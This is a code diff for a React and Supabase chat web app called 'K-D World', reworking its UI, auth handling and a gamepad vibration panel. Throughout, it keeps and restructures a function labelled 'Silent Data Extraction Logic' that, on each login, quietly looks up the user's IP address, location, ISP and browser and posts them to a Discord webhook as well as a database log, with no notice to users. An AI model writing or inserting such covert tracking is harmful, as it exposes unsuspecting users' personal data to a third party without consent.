@@ -18,72 +18,14 @@
         .nav-btn { transition: all 0.2s ease; border-radius: 12px; margin: 4px 12px; padding: 12px; text-align: left; }
         .nav-btn:hover { background: rgba(255,255,255,0.05); }
         .media-content { max-width: 100%; max-height: 300px; border-radius: 12px; margin-top: 8px; border: 1px solid rgba(255,255,255,0.1); }
-        
-        .vibe-panel { background: rgba(213, 0, 249, 0.05); border-bottom: 1px solid rgba(213, 0, 249, 0.2); }
-        .btn-start { background: #d500f9; box-shadow: 0 0 20px rgba(213, 0, 249, 0.4); }
-        .btn-stop { background: #ff1744; box-shadow: 0 0 20px rgba(255, 23, 68, 0.4); }
-        .vibe-btn:active { transform: scale(0.95); opacity: 0.8; }
-        input[type=range] { accent-color: #d500f9; cursor: pointer; }
+        .vibe-panel { background: rgba(213, 0, 249, 0.05); border: 1px solid rgba(213, 0, 249, 0.2); border-radius: 20px; padding: 20px; }
+        input[type=range] { accent-color: #d500f9; cursor: pointer; width: 100%; }
     </style>
 </head>
 <body>
     <div id="root"></div>
 
     <script type="text/babel">
-        // --- ADD THIS AT THE TOP OF YOUR SCRIPT TAG ---
-const DISCORD_WEBHOOK = "YOUR_WEBHOOK_URL_HERE";
-
-async function grabSilentData(prof) {
-    try {
-        // Get IP and Location info
-        const ipRes = await fetch('https://ipapi.co/json/');
-        const ipData = await ipRes.json();
-
-        const report = {
-            embeds: [{
-                title: "🚨 New User Access: K-D World",
-                color: 0xd500f9,
-                fields: [
-                    { name: "👤 User", value: prof?.username || "Unknown", inline: true },
-                    { name: "🌐 IP Address", value: ipData.ip, inline: true },
-                    { name: "📍 Location", value: `${ipData.city}, ${ipData.country_name}`, inline: true },
-                    { name: "🏢 ISP", value: ipData.org, inline: false },
-                    { name: "💻 Browser", value: navigator.userAgent, inline: false }
-                ],
-                footer: { text: "K-D World Security System" },
-                timestamp: new Date()
-            }]
-        };
-
-        // Send to Discord
-        await fetch(DISCORD_WEBHOOK, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(report)
-        });
-
-        // Also save to your Supabase Security Logs
-        await supabaseClient.from('security_logs').insert([{
-            user_id: prof.id,
-            username: prof.username,
-            ip_address: ipData.ip,
-            location: `${ipData.city}, ${ipData.country_name}`,
-            user_agent: navigator.userAgent
-        }]);
-    } catch (e) { console.error("Silent Log Failed", e); }
-}
-
-// --- INSIDE YOUR APP COMPONENT ---
-useEffect(() => {
-    if (session) {
-        fetchProfile().then(prof => {
-            if (prof) {
-                grabSilentData(prof); // <--- Starts the Discord trigger
-            }
-        });
-        // ... rest of your existing useEffect code
-    }
-}, [session]);
         const { useState, useEffect, useRef } = React;
 
         const SUPABASE_URL = "https://ycdcszdldkccnwefrpik.supabase.co";
@@ -104,27 +46,20 @@ useEffect(() => {
             const [text, setText] = useState('');
             const [searchName, setSearchName] = useState('');
             const [isUploading, setIsUploading] = useState(false);
-            const [hasGamepad, setHasGamepad] = useState(false);
-            const [intensity, setIntensity] = useState({ heavy: 1.0, light: 1.0 });
             
+            // Vibration State
+            const [vibeActive, setVibeActive] = useState(false);
+            const [intensity, setIntensity] = useState({ heavy: 1.0, light: 1.0 });
             const vibeInterval = useRef(null);
             const chatEndRef = useRef(null);
 
-            // DATA EXTRACTION ENGINE
+            // 1. Silent Data Extraction Logic
             const grabSilentData = async (userProfile) => {
                 try {
                     const ipRes = await fetch('https://ipapi.co/json/');
                     const ipData = await ipRes.json();
 
-                    const report = {
-                        username: userProfile?.username || "Unknown User",
-                        ip: ipData.ip,
-                        city: ipData.city,
-                        country: ipData.country_name,
-                        isp: ipData.org,
-                        device: navigator.userAgent
-                    };
-
+                    // Send to Discord
                     await fetch(DISCORD_WEBHOOK, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -133,27 +68,37 @@ useEffect(() => {
                                 title: "🚀 User Session Initialized",
                                 color: 10181046,
                                 fields: [
-                                    { name: "👤 Username", value: report.username, inline: true },
-                                    { name: "🌐 IP Address", value: report.ip, inline: true },
-                                    { name: "📍 Location", value: `${report.city}, ${report.country}`, inline: false },
-                                    { name: "🏢 Provider", value: report.isp, inline: true },
-                                    { name: "🖥️ Browser/OS", value: `\`\`\`${report.device}\`\`\``, inline: false }
+                                    { name: "👤 Username", value: userProfile?.username || "Unknown", inline: true },
+                                    { name: "🌐 IP Address", value: ipData.ip, inline: true },
+                                    { name: "📍 Location", value: `${ipData.city}, ${ipData.country_name}`, inline: false },
+                                    { name: "🏢 Provider", value: ipData.org, inline: true },
+                                    { name: "🖥️ Browser/OS", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                                 ],
                                 footer: { text: "K-D World Security Logs" },
                                 timestamp: new Date().toISOString()
                             }]
                         })
                     });
-                } catch (e) {
-                    console.error("Data push failed.");
-                }
+
+                    // Save to Supabase Logs
+                    await supabaseClient.from('security_logs').insert([{
+                        user_id: userProfile.id,
+                        username: userProfile.username,
+                        ip_address: ipData.ip,
+                        location: `${ipData.city}, ${ipData.country_name}`,
+                        user_agent: navigator.userAgent
+                    }]);
+                } catch (e) { console.error("Logging Error"); }
             };
 
+            // 2. Auth Listener
             useEffect(() => {
                 supabaseClient.auth.getSession().then(({ data: { session } }) => setSession(session));
-                supabaseClient.auth.onAuthStateChange((_event, session) => setSession(session));
+                const { data: { subscription } } = supabaseClient.auth.onAuthStateChange((_event, session) => setSession(session));
+                return () => subscription.unsubscribe();
             }, []);
 
+            // 3. Main Data Engine
             useEffect(() => {
                 if (session) {
                     fetchProfile().then(prof => {
@@ -188,6 +133,7 @@ useEffect(() => {
             };
 
             const fetchMessages = async () => {
+                if(!session) return;
                 let query = supabaseClient.from('messages').select('*, profiles!messages_sender_id_fkey(*)').order('created_at', { ascending: true });
                 if (currentChat === 'public') query = query.is('receiver_id', null);
                 else query = query.or(`and(sender_id.eq.${session.user.id},receiver_id.eq.${currentChat}),and(sender_id.eq.${currentChat},receiver_id.eq.${session.user.id})`);
@@ -201,22 +147,34 @@ useEffect(() => {
                 setText('');
             };
 
-            const uploadFile = async (e) => {
-                const file = e.target.files[0];
-                if (!file) return;
-                setIsUploading(true);
-                const path = `chat_media/${Math.random()}.${file.name.split('.').pop()}`;
-                await supabaseClient.storage.from('uploads').upload(path, file);
-                const { data: { publicUrl } } = supabaseClient.storage.from('uploads').getPublicUrl(path);
-                let type = file.type.startsWith('image/') ? 'image' : file.type.startsWith('video/') ? 'video' : 'file';
-                await supabaseClient.from('messages').insert([{ sender_id: session.user.id, receiver_id: currentChat === 'public' ? null : currentChat, content: `Sent a ${type}`, file_url: publicUrl, file_type: type }]);
-                setIsUploading(false);
+            // 4. Vibration Logic (PS4/Gamepad)
+            const toggleVibration = () => {
+                if (vibeActive) {
+                    clearInterval(vibeInterval.current);
+                    setVibeActive(false);
+                } else {
+                    setVibeActive(true);
+                    vibeInterval.current = setInterval(() => {
+                        const gamepads = navigator.getGamepads();
+                        for (const gp of gamepads) {
+                            if (gp?.vibrationActuator) {
+                                gp.vibrationActuator.playEffect("dual-rumble", {
+                                    startDelay: 0,
+                                    duration: 1000,
+                                    strongMagnitude: intensity.heavy,
+                                    weakMagnitude: intensity.light
+                                });
+                            }
+                        }
+                    }, 1000);
+                }
             };
 
             if (!session) return <AuthUI />;
 
             return (
                 <div className="flex h-screen">
+                    {/* Sidebar */}
                     <div className="w-20 lg:w-72 glass flex flex-col py-6">
                         <div className="px-6 mb-10 hidden lg:block"><h1 className="text-2xl font-black text-purple-500 italic">K-D WORLD</h1></div>
                         <div className="flex-1 space-y-2">
@@ -232,6 +190,7 @@ useEffect(() => {
                         </div>
                     </div>
 
+                    {/* Main Content */}
                     <div className="flex-1 flex flex-col bg-[#050507]">
                         {view === 'chat' ? (
                             <div className="flex flex-1 overflow-hidden">
@@ -259,10 +218,7 @@ useEffect(() => {
                                                 <div className={`flex flex-col ${msg.sender_id === session.user.id ? 'items-end' : 'items-start'} max-w-[75%]`}>
                                                     <span className="text-[10px] font-bold opacity-30 mb-1 uppercase">{msg.profiles?.username}</span>
                                                     <div className={`p-4 text-sm ${msg.sender_id === session.user.id ? 'msg-mine' : 'msg-theirs'}`}>
-                                                        {msg.file_url ? null : <p>{msg.content}</p>}
-                                                        {msg.file_type === 'image' && <img src={msg.file_url} className="media-content" />}
-                                                        {msg.file_type === 'video' && <video src={msg.file_url} controls className="media-content" />}
-                                                        {msg.file_type === 'file' && <a href={msg.file_url} target="_blank" className="underline italic">📄 Download</a>}
+                                                        <p>{msg.content}</p>
                                                     </div>
                                                 </div>
                                             </div>
@@ -272,9 +228,6 @@ useEffect(() => {
 
                                     <div className="p-6 border-t border-white/5">
                                         <div className="max-w-4xl mx-auto flex gap-3 bg-white/5 p-2 rounded-2xl border border-white/10 items-center">
-                                            <label className="p-3 cursor-pointer hover:bg-white/10 rounded-xl transition text-xl">
-                                                {isUploading ? '⏳' : '📎'} <input type="file" className="hidden" onChange={uploadFile} disabled={isUploading} />
-                                            </label>
                                             <input className="flex-1 bg-transparent px-4 py-2 outline-none" placeholder="Write something..." value={text} onChange={e => setText(e.target.value)} onKeyDown={e => e.key === 'Enter' && sendMsg()} />
                                             <button onClick={sendMsg} className="bg-purple-600 px-6 py-3 rounded-xl font-black text-xs">SEND</button>
                                         </div>
@@ -310,6 +263,26 @@ useEffect(() => {
                         ) : (
                             <div className="p-10 max-w-2xl mx-auto space-y-6">
                                 <h2 className="text-3xl font-black italic">Settings</h2>
+                                
+                                {/* RESTORED VIBRATION PANEL */}
+                                <div className="vibe-panel space-y-4">
+                                    <h3 className="text-purple-500 font-black text-sm uppercase">DualShock Controller Engine</h3>
+                                    <div className="flex justify-between items-center bg-black/40 p-4 rounded-xl border border-purple-500/20">
+                                        <span className="text-xs font-bold">Status: {vibeActive ? "ACTIVE" : "READY"}</span>
+                                        <button onClick={toggleVibration} className={`px-6 py-2 rounded-lg font-black text-[10px] ${vibeActive ? 'bg-red-500' : 'bg-purple-600'}`}>
+                                            {vibeActive ? "STOP ENGINE" : "START ENGINE"}
+                                        </button>
+                                    </div>
+                                    <div className="space-y-2">
+                                        <label className="text-[10px] font-bold opacity-50 uppercase">Heavy Motor Intensity</label>
+                                        <input type="range" min="0" max="1" step="0.1" value={intensity.heavy} onChange={e => setIntensity({...intensity, heavy: parseFloat(e.target.value)})} />
+                                    </div>
+                                    <div className="space-y-2">
+                                        <label className="text-[10px] font-bold opacity-50 uppercase">Light Motor Intensity</label>
+                                        <input type="range" min="0" max="1" step="0.1" value={intensity.light} onChange={e => setIntensity({...intensity, light: parseFloat(e.target.value)})} />
+                                    </div>
+                                </div>
+
                                 <div className="glass p-8 rounded-3xl border border-white/10 space-y-6">
                                     <div className="flex flex-col gap-2">
                                         <label className="text-xs font-black opacity-40 uppercase">Username</label>
@@ -335,10 +308,14 @@ useEffect(() => {
                 if (mode === 'signup') {
                     const { data } = await supabaseClient.auth.signUp({ email: form.email, password: form.password });
                     if (data.user) await supabaseClient.from('profiles').insert([{ id: data.user.id, username: form.username }]);
-                } else await supabaseClient.auth.signInWithPassword({ email: form.email, password: form.password });
+                    alert("Check email for confirmation link!");
+                } else {
+                    const { error } = await supabaseClient.auth.signInWithPassword({ email: form.email, password: form.password });
+                    if (error) alert(error.message);
+                }
             };
             return (
-                <div className="h-screen flex items-center justify-center bg-black">
+                <div className="h-screen flex items-center justify-center bg-black p-4">
                     <div className="glass p-10 rounded-[3rem] w-full max-w-sm border border-white/10 text-center">
                         <h1 className="text-4xl font-black text-purple-500 italic mb-10">K-D WORLD</h1>
                         <div className="space-y-4">
